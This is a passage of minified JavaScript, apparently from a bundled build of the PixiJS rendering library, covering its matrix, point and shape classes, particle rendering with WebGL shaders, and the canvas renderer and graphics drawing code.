),ObjectRenderer:t("./renderers/webgl/utils/ObjectRenderer"),RenderTarget:t("./renderers/webgl/utils/RenderTarget"),AbstractFilter:t("./renderers/webgl/filters/AbstractFilter"),FXAAFilter:t("./renderers/webgl/filters/FXAAFilter"),SpriteMaskFilter:t("./renderers/webgl/filters/SpriteMaskFilter"),autoDetectRenderer:function(t,e,r,n){return t=t||800,e=e||600,!n&&i.utils.isWebGLSupported()?new i.WebGLRenderer(t,e,r):new i.CanvasRenderer(t,e,r)}})},{"./const":22,"./display/Container":23,"./display/DisplayObject":24,"./graphics/Graphics":25,"./graphics/GraphicsData":26,"./graphics/webgl/GraphicsRenderer":27,"./math":32,"./particles/ParticleContainer":38,"./particles/webgl/ParticleRenderer":40,"./renderers/canvas/CanvasRenderer":43,"./renderers/canvas/utils/CanvasBuffer":44,"./renderers/canvas/utils/CanvasGraphics":45,"./renderers/webgl/WebGLRenderer":48,"./renderers/webgl/filters/AbstractFilter":49,"./renderers/webgl/filters/FXAAFilter":50,"./renderers/webgl/filters/SpriteMaskFilter":51,"./renderers/webgl/managers/ShaderManager":55,"./renderers/webgl/shaders/Shader":60,"./renderers/webgl/utils/ObjectRenderer":62,"./renderers/webgl/utils/RenderTarget":64,"./sprites/Sprite":66,"./sprites/webgl/SpriteRenderer":67,"./text/Text":68,"./textures/BaseTexture":69,"./textures/RenderTexture":70,"./textures/Texture":71,"./textures/TextureUvs":72,"./textures/VideoBaseTexture":73,"./ticker":75,"./utils":76}],30:[function(t,e,r){function i(){this.a=1,this.b=0,this.c=0,this.d=1,this.tx=0,this.ty=0}var n=t("./Point");i.prototype.constructor=i,e.exports=i,i.prototype.fromArray=function(t){this.a=t[0],this.b=t[1],this.c=t[3],this.d=t[4],this.tx=t[2],this.ty=t[5]},i.prototype.toArray=function(t,e){this.array||(this.array=new Float32Array(9));var r=e||this.array;return t?(r[0]=this.a,r[1]=this.b,r[2]=0,r[3]=this.c,r[4]=this.d,r[5]=0,r[6]=this.tx,r[7]=this.ty,r[8]=1):(r[0]=this.a,r[1]=this.c,r[2]=this.tx,r[3]=this.b,r[4]=this.d,r[5]=this.ty,r[6]=0,r[7]=0,r[8]=1),r},i.prototype.apply=function(t,e){e=e||new n;var r=t.x,i=t.y;return e.x=this.a*r+this.c*i+this.tx,e.y=this.b*r+this.d*i+this.ty,e},i.prototype.applyInverse=function(t,e){e=e||new n;var r=1/(this.a*this.d+this.c*-this.b),i=t.x,o=t.y;return e.x=this.d*r*i+-this.c*r*o+(this.ty*this.c-this.tx*this.d)*r,e.y=this.a*r*o+-this.b*r*i+(-this.ty*this.a+this.tx*this.b)*r,e},i.prototype.translate=function(t,e){return this.tx+=t,this.ty+=e,this},i.prototype.scale=function(t,e){return this.a*=t,this.d*=e,this.c*=t,this.b*=e,this.tx*=t,this.ty*=e,this},i.prototype.rotate=function(t){var e=Math.cos(t),r=Math.sin(t),i=this.a,n=this.c,o=this.tx;return this.a=i*e-this.b*r,this.b=i*r+this.b*e,this.c=n*e-this.d*r,this.d=n*r+this.d*e,this.tx=o*e-this.ty*r,this.ty=o*r+this.ty*e,this},i.prototype.append=function(t){var e=this.a,r=this.b,i=this.c,n=this.d;return this.a=t.a*e+t.b*i,this.b=t.a*r+t.b*n,this.c=t.c*e+t.d*i,this.d=t.c*r+t.d*n,this.tx=t.tx*e+t.ty*i+this.tx,this.ty=t.tx*r+t.ty*n+this.ty,this},i.prototype.prepend=function(t){var e=this.tx;if(1!==t.a||0!==t.b||0!==t.c||1!==t.d){var r=this.a,i=this.c;this.a=r*t.a+this.b*t.c,this.b=r*t.b+this.b*t.d,this.c=i*t.a+this.d*t.c,this.d=i*t.b+this.d*t.d}return this.tx=e*t.a+this.ty*t.c+t.tx,this.ty=e*t.b+this.ty*t.d+t.ty,this},i.prototype.invert=function(){var t=this.a,e=this.b,r=this.c,i=this.d,n=this.tx,o=t*i-e*r;return this.a=i/o,this.b=-e/o,this.c=-r/o,this.d=t/o,this.tx=(r*this.ty-i*n)/o,this.ty=-(t*this.ty-e*n)/o,this},i.prototype.identity=function(){return this.a=1,this.b=0,this.c=0,this.d=1,this.tx=0,this.ty=0,this},i.prototype.clone=function(){var t=new i;return t.a=this.a,t.b=this.b,t.c=this.c,t.d=this.d,t.tx=this.tx,t.ty=this.ty,t},i.prototype.copy=function(t){return t.a=this.a,t.b=this.b,t.c=this.c,t.d=this.d,t.tx=this.tx,t.ty=this.ty,t},i.IDENTITY=new i,i.TEMP_MATRIX=new i},{"./Point":31}],31:[function(t,e,r){function i(t,e){this.x=t||0,this.y=e||0}i.prototype.constructor=i,e.exports=i,i.prototype.clone=function(){return new i(this.x,this.y)},i.prototype.copy=function(t){this.set(t.x,t.y)},i.prototype.equals=function(t){return t.x===this.x&&t.y===this.y},i.prototype.set=function(t,e){this.x=t||0,this.y=e||(0!==e?this.x:0)}},{}],32:[function(t,e,r){e.exports={Point:t("./Point"),Matrix:t("./Matrix"),Circle:t("./shapes/Circle"),Ellipse:t("./shapes/Ellipse"),Polygon:t("./shapes/Polygon"),Rectangle:t("./shapes/Rectangle"),RoundedRectangle:t("./shapes/RoundedRectangle")}},{"./Matrix":30,"./Point":31,"./shapes/Circle":33,"./shapes/Ellipse":34,"./shapes/Polygon":35,"./shapes/Rectangle":36,"./shapes/RoundedRectangle":37}],33:[function(t,e,r){function i(t,e,r){this.x=t||0,this.y=e||0,this.radius=r||0,this.type=o.SHAPES.CIRC}var n=t("./Rectangle"),o=t("../../const");i.prototype.constructor=i,e.exports=i,i.prototype.clone=function(){return new i(this.x,this.y,this.radius)},i.prototype.contains=function(t,e){if(this.radius<=0)return!1;var r=this.x-t,i=this.y-e,n=this.radius*this.radius;return r*=r,i*=i,n>=r+i},i.prototype.getBounds=function(){return new n(this.x-this.radius,this.y-this.radius,2*this.radius,2*this.radius)}},{"../../const":22,"./Rectangle":36}],34:[function(t,e,r){function i(t,e,r,i){this.x=t||0,this.y=e||0,this.width=r||0,this.height=i||0,this.type=o.SHAPES.ELIP}var n=t("./Rectangle"),o=t("../../const");i.prototype.constructor=i,e.exports=i,i.prototype.clone=function(){return new i(this.x,this.y,this.width,this.height)},i.prototype.contains=function(t,e){if(this.width<=0||this.height<=0)return!1;var r=(t-this.x)/this.width,i=(e-this.y)/this.height;return r*=r,i*=i,1>=r+i},i.prototype.getBounds=function(){return new n(this.x-this.width,this.y-this.height,this.width,this.height)}},{"../../const":22,"./Rectangle":36}],35:[function(t,e,r){function i(t){var e=t;if(!Array.isArray(e)){e=new Array(arguments.length);for(var r=0;r<e.length;++r)e[r]=arguments[r]}if(e[0]instanceof n){for(var i=[],s=0,a=e.length;a>s;s++)i.push(e[s].x,e[s].y);e=i}this.closed=!0,this.points=e,this.type=o.SHAPES.POLY}var n=t("../Point"),o=t("../../const");i.prototype.constructor=i,e.exports=i,i.prototype.clone=function(){return new i(this.points.slice())},i.prototype.contains=function(t,e){for(var r=!1,i=this.points.length/2,n=0,o=i-1;i>n;o=n++){var s=this.points[2*n],a=this.points[2*n+1],h=this.points[2*o],l=this.points[2*o+1],u=a>e!=l>e&&(h-s)*(e-a)/(l-a)+s>t;u&&(r=!r)}return r}},{"../../const":22,"../Point":31}],36:[function(t,e,r){function i(t,e,r,i){this.x=t||0,this.y=e||0,this.width=r||0,this.height=i||0,this.type=n.SHAPES.RECT}var n=t("../../const");i.prototype.constructor=i,e.exports=i,i.EMPTY=new i(0,0,0,0),i.prototype.clone=function(){return new i(this.x,this.y,this.width,this.height)},i.prototype.contains=function(t,e){return this.width<=0||this.height<=0?!1:t>=this.x&&t<this.x+this.width&&e>=this.y&&e<this.y+this.height?!0:!1}},{"../../const":22}],37:[function(t,e,r){function i(t,e,r,i,o){this.x=t||0,this.y=e||0,this.width=r||0,this.height=i||0,this.radius=o||20,this.type=n.SHAPES.RREC}var n=t("../../const");i.prototype.constructor=i,e.exports=i,i.prototype.clone=function(){return new i(this.x,this.y,this.width,this.height,this.radius)},i.prototype.contains=function(t,e){return this.width<=0||this.height<=0?!1:t>=this.x&&t<=this.x+this.width&&e>=this.y&&e<=this.y+this.height?!0:!1}},{"../../const":22}],38:[function(t,e,r){function i(t,e){n.call(this),this._properties=[!1,!0,!1,!1,!1],this._size=t||15e3,this._buffers=null,this._updateStatic=!1,this.interactiveChildren=!1,this.blendMode=o.BLEND_MODES.NORMAL,this.roundPixels=!0,this.setProperties(e)}var n=t("../display/Container"),o=t("../const");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.setProperties=function(t){t&&(this._properties[0]="scale"in t?!!t.scale:this._properties[0],this._properties[1]="position"in t?!!t.position:this._properties[1],this._properties[2]="rotation"in t?!!t.rotation:this._properties[2],this._properties[3]="uvs"in t?!!t.uvs:this._properties[3],this._properties[4]="alpha"in t?!!t.alpha:this._properties[4])},i.prototype.updateTransform=function(){
this.displayObjectUpdateTransform()},i.prototype.renderWebGL=function(t){this.visible&&!(this.worldAlpha<=0)&&this.children.length&&this.renderable&&(t.setObjectRenderer(t.plugins.particle),t.plugins.particle.render(this))},i.prototype.addChildAt=function(t,e){if(t===this)return t;if(e>=0&&e<=this.children.length)return t.parent&&t.parent.removeChild(t),t.parent=this,this.children.splice(e,0,t),this._updateStatic=!0,t;throw new Error(t+"addChildAt: The index "+e+" supplied is out of bounds "+this.children.length)},i.prototype.removeChildAt=function(t){var e=this.getChildAt(t);return e.parent=null,this.children.splice(t,1),this._updateStatic=!0,e},i.prototype.renderCanvas=function(t){if(this.visible&&!(this.worldAlpha<=0)&&this.children.length&&this.renderable){var e=t.context,r=this.worldTransform,i=!0,n=0,o=0,s=0,a=0;e.globalAlpha=this.worldAlpha,this.displayObjectUpdateTransform();for(var h=0;h<this.children.length;++h){var l=this.children[h];if(l.visible){var u=l.texture.frame;if(e.globalAlpha=this.worldAlpha*l.alpha,l.rotation%(2*Math.PI)===0)i&&(e.setTransform(r.a,r.b,r.c,r.d,r.tx,r.ty),i=!1),n=l.anchor.x*-u.width*l.scale.x+l.position.x+.5,o=l.anchor.y*-u.height*l.scale.y+l.position.y+.5,s=u.width*l.scale.x,a=u.height*l.scale.y;else{i||(i=!0),l.displayObjectUpdateTransform();var c=l.worldTransform;t.roundPixels?e.setTransform(c.a,c.b,c.c,c.d,0|c.tx,0|c.ty):e.setTransform(c.a,c.b,c.c,c.d,c.tx,c.ty),n=l.anchor.x*-u.width+.5,o=l.anchor.y*-u.height+.5,s=u.width,a=u.height}e.drawImage(l.texture.baseTexture.source,u.x,u.y,u.width,u.height,n,o,s,a)}}}},i.prototype.destroy=function(){if(n.prototype.destroy.apply(this,arguments),this._buffers)for(var t=0;t<this._buffers.length;++t)this._buffers[t].destroy();this._properties=null,this._buffers=null}},{"../const":22,"../display/Container":23}],39:[function(t,e,r){function i(t,e,r){this.gl=t,this.vertSize=2,this.vertByteSize=4*this.vertSize,this.size=r,this.dynamicProperties=[],this.staticProperties=[];for(var i=0;i<e.length;i++){var n=e[i];n.dynamic?this.dynamicProperties.push(n):this.staticProperties.push(n)}this.staticStride=0,this.staticBuffer=null,this.staticData=null,this.dynamicStride=0,this.dynamicBuffer=null,this.dynamicData=null,this.initBuffers()}i.prototype.constructor=i,e.exports=i,i.prototype.initBuffers=function(){var t,e,r=this.gl,i=0;for(this.dynamicStride=0,t=0;t<this.dynamicProperties.length;t++)e=this.dynamicProperties[t],e.offset=i,i+=e.size,this.dynamicStride+=e.size;this.dynamicData=new Float32Array(this.size*this.dynamicStride*4),this.dynamicBuffer=r.createBuffer(),r.bindBuffer(r.ARRAY_BUFFER,this.dynamicBuffer),r.bufferData(r.ARRAY_BUFFER,this.dynamicData,r.DYNAMIC_DRAW);var n=0;for(this.staticStride=0,t=0;t<this.staticProperties.length;t++)e=this.staticProperties[t],e.offset=n,n+=e.size,this.staticStride+=e.size;this.staticData=new Float32Array(this.size*this.staticStride*4),this.staticBuffer=r.createBuffer(),r.bindBuffer(r.ARRAY_BUFFER,this.staticBuffer),r.bufferData(r.ARRAY_BUFFER,this.staticData,r.DYNAMIC_DRAW)},i.prototype.uploadDynamic=function(t,e,r){for(var i=this.gl,n=0;n<this.dynamicProperties.length;n++){var o=this.dynamicProperties[n];o.uploadFunction(t,e,r,this.dynamicData,this.dynamicStride,o.offset)}i.bindBuffer(i.ARRAY_BUFFER,this.dynamicBuffer),i.bufferSubData(i.ARRAY_BUFFER,0,this.dynamicData)},i.prototype.uploadStatic=function(t,e,r){for(var i=this.gl,n=0;n<this.staticProperties.length;n++){var o=this.staticProperties[n];o.uploadFunction(t,e,r,this.staticData,this.staticStride,o.offset)}i.bindBuffer(i.ARRAY_BUFFER,this.staticBuffer),i.bufferSubData(i.ARRAY_BUFFER,0,this.staticData)},i.prototype.bind=function(){var t,e,r=this.gl;for(r.bindBuffer(r.ARRAY_BUFFER,this.dynamicBuffer),t=0;t<this.dynamicProperties.length;t++)e=this.dynamicProperties[t],r.vertexAttribPointer(e.attribute,e.size,r.FLOAT,!1,4*this.dynamicStride,4*e.offset);for(r.bindBuffer(r.ARRAY_BUFFER,this.staticBuffer),t=0;t<this.staticProperties.length;t++)e=this.staticProperties[t],r.vertexAttribPointer(e.attribute,e.size,r.FLOAT,!1,4*this.staticStride,4*e.offset)},i.prototype.destroy=function(){this.dynamicProperties=null,this.dynamicData=null,this.gl.deleteBuffer(this.dynamicBuffer),this.staticProperties=null,this.staticData=null,this.gl.deleteBuffer(this.staticBuffer)}},{}],40:[function(t,e,r){function i(t){n.call(this,t),this.size=15e3;var e=6*this.size;this.indices=new Uint16Array(e);for(var r=0,i=0;e>r;r+=6,i+=4)this.indices[r+0]=i+0,this.indices[r+1]=i+1,this.indices[r+2]=i+2,this.indices[r+3]=i+0,this.indices[r+4]=i+2,this.indices[r+5]=i+3;this.shader=null,this.indexBuffer=null,this.properties=null,this.tempMatrix=new h.Matrix}var n=t("../../renderers/webgl/utils/ObjectRenderer"),o=t("../../renderers/webgl/WebGLRenderer"),s=t("./ParticleShader"),a=t("./ParticleBuffer"),h=t("../../math");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,o.registerPlugin("particle",i),i.prototype.onContextChange=function(){var t=this.renderer.gl;this.shader=new s(this.renderer.shaderManager),this.indexBuffer=t.createBuffer(),t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,this.indexBuffer),t.bufferData(t.ELEMENT_ARRAY_BUFFER,this.indices,t.STATIC_DRAW),this.properties=[{attribute:this.shader.attributes.aVertexPosition,dynamic:!1,size:2,uploadFunction:this.uploadVertices,offset:0},{attribute:this.shader.attributes.aPositionCoord,dynamic:!0,size:2,uploadFunction:this.uploadPosition,offset:0},{attribute:this.shader.attributes.aRotation,dynamic:!1,size:1,uploadFunction:this.uploadRotation,offset:0},{attribute:this.shader.attributes.aTextureCoord,dynamic:!1,size:2,uploadFunction:this.uploadUvs,offset:0},{attribute:this.shader.attributes.aColor,dynamic:!1,size:1,uploadFunction:this.uploadAlpha,offset:0}]},i.prototype.start=function(){var t=this.renderer.gl;t.activeTexture(t.TEXTURE0),t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,this.indexBuffer);var e=this.shader;this.renderer.shaderManager.setShader(e)},i.prototype.render=function(t){var e=t.children,r=e.length,i=t._size;if(0!==r){r>i&&(r=i),t._buffers||(t._buffers=this.generateBuffers(t)),this.renderer.blendModeManager.setBlendMode(t.blendMode);var n=this.renderer.gl,o=t.worldTransform.copy(this.tempMatrix);o.prepend(this.renderer.currentRenderTarget.projectionMatrix),n.uniformMatrix3fv(this.shader.uniforms.projectionMatrix._location,!1,o.toArray(!0)),n.uniform1f(this.shader.uniforms.uAlpha._location,t.worldAlpha);var s=t._updateStatic,a=e[0]._texture.baseTexture;if(a._glTextures[n.id])n.bindTexture(n.TEXTURE_2D,a._glTextures[n.id]);else{if(!this.renderer.updateTexture(a))return;this.properties[0].dynamic&&this.properties[3].dynamic||(s=!0)}for(var h=0,l=0;r>l;l+=this.size){var u=r-l;u>this.size&&(u=this.size);var c=t._buffers[h++];c.uploadDynamic(e,l,u),s&&c.uploadStatic(e,l,u),c.bind(this.shader),n.drawElements(n.TRIANGLES,6*u,n.UNSIGNED_SHORT,0),this.renderer.drawCount++}t._updateStatic=!1}},i.prototype.generateBuffers=function(t){var e,r=this.renderer.gl,i=[],n=t._size;for(e=0;e<t._properties.length;e++)this.properties[e].dynamic=t._properties[e];for(e=0;n>e;e+=this.size)i.push(new a(r,this.properties,this.size,this.shader));return i},i.prototype.uploadVertices=function(t,e,r,i,n,o){for(var s,a,h,l,u,c,p,d,f,v=0;r>v;v++)s=t[e+v],a=s._texture,l=s.scale.x,u=s.scale.y,a.trim?(h=a.trim,p=h.x-s.anchor.x*h.width,c=p+a.crop.width,f=h.y-s.anchor.y*h.height,d=f+a.crop.height):(c=a._frame.width*(1-s.anchor.x),p=a._frame.width*-s.anchor.x,d=a._frame.height*(1-s.anchor.y),f=a._frame.height*-s.anchor.y),i[o]=p*l,i[o+1]=f*u,i[o+n]=c*l,i[o+n+1]=f*u,i[o+2*n]=c*l,i[o+2*n+1]=d*u,i[o+3*n]=p*l,i[o+3*n+1]=d*u,o+=4*n},i.prototype.uploadPosition=function(t,e,r,i,n,o){for(var s=0;r>s;s++){var a=t[e+s].position;i[o]=a.x,i[o+1]=a.y,i[o+n]=a.x,i[o+n+1]=a.y,i[o+2*n]=a.x,i[o+2*n+1]=a.y,i[o+3*n]=a.x,i[o+3*n+1]=a.y,o+=4*n}},i.prototype.uploadRotation=function(t,e,r,i,n,o){for(var s=0;r>s;s++){var a=t[e+s].rotation;i[o]=a,i[o+n]=a,i[o+2*n]=a,i[o+3*n]=a,o+=4*n}},i.prototype.uploadUvs=function(t,e,r,i,n,o){for(var s=0;r>s;s++){var a=t[e+s]._texture._uvs;a?(i[o]=a.x0,i[o+1]=a.y0,i[o+n]=a.x1,i[o+n+1]=a.y1,i[o+2*n]=a.x2,i[o+2*n+1]=a.y2,i[o+3*n]=a.x3,i[o+3*n+1]=a.y3,o+=4*n):(i[o]=0,i[o+1]=0,i[o+n]=0,i[o+n+1]=0,i[o+2*n]=0,i[o+2*n+1]=0,i[o+3*n]=0,i[o+3*n+1]=0,o+=4*n)}},i.prototype.uploadAlpha=function(t,e,r,i,n,o){for(var s=0;r>s;s++){var a=t[e+s].alpha;i[o]=a,i[o+n]=a,i[o+2*n]=a,i[o+3*n]=a,o+=4*n}},i.prototype.destroy=function(){this.renderer.gl&&this.renderer.gl.deleteBuffer(this.indexBuffer),n.prototype.destroy.apply(this,arguments),this.shader.destroy(),this.indices=null,this.tempMatrix=null}},{"../../math":32,"../../renderers/webgl/WebGLRenderer":48,"../../renderers/webgl/utils/ObjectRenderer":62,"./ParticleBuffer":39,"./ParticleShader":41}],41:[function(t,e,r){function i(t){n.call(this,t,["attribute vec2 aVertexPosition;","attribute vec2 aTextureCoord;","attribute float aColor;","attribute vec2 aPositionCoord;","attribute vec2 aScale;","attribute float aRotation;","uniform mat3 projectionMatrix;","varying vec2 vTextureCoord;","varying float vColor;","void main(void){","   vec2 v = aVertexPosition;","   v.x = (aVertexPosition.x) * cos(aRotation) - (aVertexPosition.y) * sin(aRotation);","   v.y = (aVertexPosition.x) * sin(aRotation) + (aVertexPosition.y) * cos(aRotation);","   v = v + aPositionCoord;","   gl_Position = vec4((projectionMatrix * vec3(v, 1.0)).xy, 0.0, 1.0);","   vTextureCoord = aTextureCoord;","   vColor = aColor;","}"].join("\n"),["precision lowp float;","varying vec2 vTextureCoord;","varying float vColor;","uniform sampler2D uSampler;","uniform float uAlpha;","void main(void){","  vec4 color = texture2D(uSampler, vTextureCoord) * vColor * uAlpha;","  if (color.a == 0.0) discard;","  gl_FragColor = color;","}"].join("\n"),{uAlpha:{type:"1f",value:1}},{aPositionCoord:0,aRotation:0})}var n=t("../../renderers/webgl/shaders/TextureShader");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i},{"../../renderers/webgl/shaders/TextureShader":61}],42:[function(t,e,r){function i(t,e,r,i){if(a.call(this),n.sayHello(t),i)for(var h in s.DEFAULT_RENDER_OPTIONS)"undefined"==typeof i[h]&&(i[h]=s.DEFAULT_RENDER_OPTIONS[h]);else i=s.DEFAULT_RENDER_OPTIONS;this.type=s.RENDERER_TYPE.UNKNOWN,this.width=e||800,this.height=r||600,this.view=i.view||document.createElement("canvas"),this.resolution=i.resolution,this.transparent=i.transparent,this.autoResize=i.autoResize||!1,this.blendModes=null,this.preserveDrawingBuffer=i.preserveDrawingBuffer,this.clearBeforeRender=i.clearBeforeRender,this._backgroundColor=0,this._backgroundColorRgb=[0,0,0],this._backgroundColorString="#000000",this.backgroundColor=i.backgroundColor||this._backgroundColor,this._tempDisplayObjectParent={worldTransform:new o.Matrix,worldAlpha:1,children:[]},this._lastObjectRendered=this._tempDisplayObjectParent}var n=t("../utils"),o=t("../math"),s=t("../const"),a=t("eventemitter3");i.prototype=Object.create(a.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{backgroundColor:{get:function(){return this._backgroundColor},set:function(t){this._backgroundColor=t,this._backgroundColorString=n.hex2string(t),n.hex2rgb(t,this._backgroundColorRgb)}}}),i.prototype.resize=function(t,e){this.width=t*this.resolution,this.height=e*this.resolution,this.view.width=this.width,this.view.height=this.height,this.autoResize&&(this.view.style.width=this.width/this.resolution+"px",this.view.style.height=this.height/this.resolution+"px")},i.prototype.destroy=function(t){t&&this.view.parent&&this.view.parent.removeChild(this.view),this.type=s.RENDERER_TYPE.UNKNOWN,this.width=0,this.height=0,this.view=null,this.resolution=0,this.transparent=!1,this.autoResize=!1,this.blendModes=null,this.preserveDrawingBuffer=!1,this.clearBeforeRender=!1,this._backgroundColor=0,this._backgroundColorRgb=null,this._backgroundColorString=null}},{"../const":22,"../math":32,"../utils":76,eventemitter3:11}],43:[function(t,e,r){function i(t,e,r){n.call(this,"Canvas",t,e,r),this.type=h.RENDERER_TYPE.CANVAS,this.context=this.view.getContext("2d",{alpha:this.transparent}),this.refresh=!0,this.maskManager=new o,this.roundPixels=!1,this.currentScaleMode=h.SCALE_MODES.DEFAULT,this.currentBlendMode=h.BLEND_MODES.NORMAL,this.smoothProperty="imageSmoothingEnabled",this.context.imageSmoothingEnabled||(this.context.webkitImageSmoothingEnabled?this.smoothProperty="webkitImageSmoothingEnabled":this.context.mozImageSmoothingEnabled?this.smoothProperty="mozImageSmoothingEnabled":this.context.oImageSmoothingEnabled?this.smoothProperty="oImageSmoothingEnabled":this.context.msImageSmoothingEnabled&&(this.smoothProperty="msImageSmoothingEnabled")),this.initPlugins(),this._mapBlendModes(),this._tempDisplayObjectParent={worldTransform:new a.Matrix,worldAlpha:1},this.resize(t,e)}var n=t("../SystemRenderer"),o=t("./utils/CanvasMaskManager"),s=t("../../utils"),a=t("../../math"),h=t("../../const");i.prototype=Object.create(n.prototype),i.prototype.constructor=i,e.exports=i,s.pluginTarget.mixin(i),i.prototype.render=function(t){var e=t.parent;this._lastObjectRendered=t,t.parent=this._tempDisplayObjectParent,t.updateTransform(),t.parent=e,this.context.setTransform(1,0,0,1,0,0),this.context.globalAlpha=1,this.currentBlendMode=h.BLEND_MODES.NORMAL,this.context.globalCompositeOperation=this.blendModes[h.BLEND_MODES.NORMAL],navigator.isCocoonJS&&this.view.screencanvas&&(this.context.fillStyle="black",this.context.clear()),this.clearBeforeRender&&(this.transparent?this.context.clearRect(0,0,this.width,this.height):(this.context.fillStyle=this._backgroundColorString,this.context.fillRect(0,0,this.width,this.height))),this.renderDisplayObject(t,this.context)},i.prototype.destroy=function(t){this.destroyPlugins(),n.prototype.destroy.call(this,t),this.context=null,this.refresh=!0,this.maskManager.destroy(),this.maskManager=null,this.roundPixels=!1,this.currentScaleMode=0,this.currentBlendMode=0,this.smoothProperty=null},i.prototype.renderDisplayObject=function(t,e){var r=this.context;this.context=e,t.renderCanvas(this),this.context=r},i.prototype.resize=function(t,e){n.prototype.resize.call(this,t,e),this.currentScaleMode=h.SCALE_MODES.DEFAULT,this.smoothProperty&&(this.context[this.smoothProperty]=this.currentScaleMode===h.SCALE_MODES.LINEAR)},i.prototype._mapBlendModes=function(){this.blendModes||(this.blendModes={},s.canUseNewCanvasBlendModes()?(this.blendModes[h.BLEND_MODES.NORMAL]="source-over",this.blendModes[h.BLEND_MODES.ADD]="lighter",this.blendModes[h.BLEND_MODES.MULTIPLY]="multiply",this.blendModes[h.BLEND_MODES.SCREEN]="screen",this.blendModes[h.BLEND_MODES.OVERLAY]="overlay",this.blendModes[h.BLEND_MODES.DARKEN]="darken",this.blendModes[h.BLEND_MODES.LIGHTEN]="lighten",this.blendModes[h.BLEND_MODES.COLOR_DODGE]="color-dodge",this.blendModes[h.BLEND_MODES.COLOR_BURN]="color-burn",this.blendModes[h.BLEND_MODES.HARD_LIGHT]="hard-light",this.blendModes[h.BLEND_MODES.SOFT_LIGHT]="soft-light",this.blendModes[h.BLEND_MODES.DIFFERENCE]="difference",this.blendModes[h.BLEND_MODES.EXCLUSION]="exclusion",this.blendModes[h.BLEND_MODES.HUE]="hue",this.blendModes[h.BLEND_MODES.SATURATION]="saturate",this.blendModes[h.BLEND_MODES.COLOR]="color",this.blendModes[h.BLEND_MODES.LUMINOSITY]="luminosity"):(this.blendModes[h.BLEND_MODES.NORMAL]="source-over",this.blendModes[h.BLEND_MODES.ADD]="lighter",this.blendModes[h.BLEND_MODES.MULTIPLY]="source-over",this.blendModes[h.BLEND_MODES.SCREEN]="source-over",this.blendModes[h.BLEND_MODES.OVERLAY]="source-over",this.blendModes[h.BLEND_MODES.DARKEN]="source-over",this.blendModes[h.BLEND_MODES.LIGHTEN]="source-over",this.blendModes[h.BLEND_MODES.COLOR_DODGE]="source-over",this.blendModes[h.BLEND_MODES.COLOR_BURN]="source-over",this.blendModes[h.BLEND_MODES.HARD_LIGHT]="source-over",this.blendModes[h.BLEND_MODES.SOFT_LIGHT]="source-over",this.blendModes[h.BLEND_MODES.DIFFERENCE]="source-over",this.blendModes[h.BLEND_MODES.EXCLUSION]="source-over",this.blendModes[h.BLEND_MODES.HUE]="source-over",this.blendModes[h.BLEND_MODES.SATURATION]="source-over",this.blendModes[h.BLEND_MODES.COLOR]="source-over",this.blendModes[h.BLEND_MODES.LUMINOSITY]="source-over"))}},{"../../const":22,"../../math":32,"../../utils":76,"../SystemRenderer":42,"./utils/CanvasMaskManager":46}],44:[function(t,e,r){function i(t,e){this.canvas=document.createElement("canvas"),this.context=this.canvas.getContext("2d"),this.canvas.width=t,this.canvas.height=e}i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{width:{get:function(){return this.canvas.width},set:function(t){this.canvas.width=t}},height:{get:function(){return this.canvas.height},set:function(t){this.canvas.height=t}}}),i.prototype.clear=function(){this.context.setTransform(1,0,0,1,0,0),this.context.clearRect(0,0,this.canvas.width,this.canvas.height)},i.prototype.resize=function(t,e){this.canvas.width=t,this.canvas.height=e},i.prototype.destroy=function(){this.context=null,this.canvas=null}},{}],45:[function(t,e,r){var i=t("../../../const"),n={};e.exports=n,n.renderGraphics=function(t,e){var r=t.worldAlpha;t.dirty&&(this.updateGraphicsTint(t),t.dirty=!1);for(var n=0;n<t.graphicsData.length;n++){var o=t.graphicsData[n],s=o.shape,a=o._fillTint,h=o._lineTint;if(e.lineWidth=o.lineWidth,o.type===i.SHAPES.POLY){e.beginPath();var l=s.points;e.moveTo(l[0],l[1]);for(var u=1;u<l.length/2;u++)e.lineTo(l[2*u],l[2*u+1]);s.closed&&e.lineTo(l[0],l[1]),l[0]===l[l.length-2]&&l[1]===l[l.length-1]&&e.closePath(),o.fill&&(e.globalAlpha=o.fillAlpha*r,e.fillStyle="#"+("00000"+(0|a).toString(16)).substr(-6),e.fill()),o.lineWidth&&(e.globalAlpha=o.lineAlpha*r,e.strokeStyle="#"+("00000"+(0|h).toString(16)).substr(-6),e.stroke())}else if(o.type===i.SHAPES.RECT)(o.fillColor||0===o.fillColor)&&(e.globalAlpha=o.fillAlpha*r,e.fillStyle="#"+("00000"+(0|a).toString(16)).substr(-6),e.fillRect(s.x,s.y,s.width,s.height)),o.lineWidth&&(e.globalAlpha=o.lineAlpha*r,e.strokeStyle="#"+("00000"+(0|h).toString(16)).substr(-6),e.strokeRect(s.x,s.y,s.width,s.height));else if(o.type===i.SHAPES.CIRC)e.beginPath(),e.arc(s.x,s.y,s.radius,0,2*Math.PI),e.closePath(),o.fill&&(e.globalAlpha=o.fillAlpha*r,e.fillStyle="#"+("00000"+(0|a).toString(16)).substr(-6),e.fill()),o.lineWidth&&(e.globalAlpha=o.lineAlpha*r,e.strokeStyle="#"+("00000"+(0|h).toString(16)).substr(-6),e.stroke());else if(o.type===i.SHAPES.ELIP){var c=2*s.width,p=2*s.height,d=s.x-c/2,f=s.y-p/2;e.beginPath();var v=.5522848,g=c/2*v,m=p/2*v,y=d+c,x=f+p,b=d+c/2,_=f+p/2;e.moveTo(d,_),e.bezierCurveTo(d,_-m,b-g,f,b,f),e.bezierCurveTo(b+g,f,y,_-m,y,_),e.bezierCurveTo(y,_+m,b+g,x,b,x),e.bezierCurveTo(b-g,x,d,_+m,d,_),e.closePath(),o.fill&&(e.globalAlpha=o.fillAlpha*r,e.fillStyle="#"+("00000"+(0|a).toString(16)).substr(-6),e.fill()),o.lineWidth&&(e.globalAlpha=o.lineAlpha*r,e.strokeStyle="#"+("00000"+(0|h).toString(16)).substr(-6),e.stroke())}else if(o.type===i.SHAPES.RREC){var 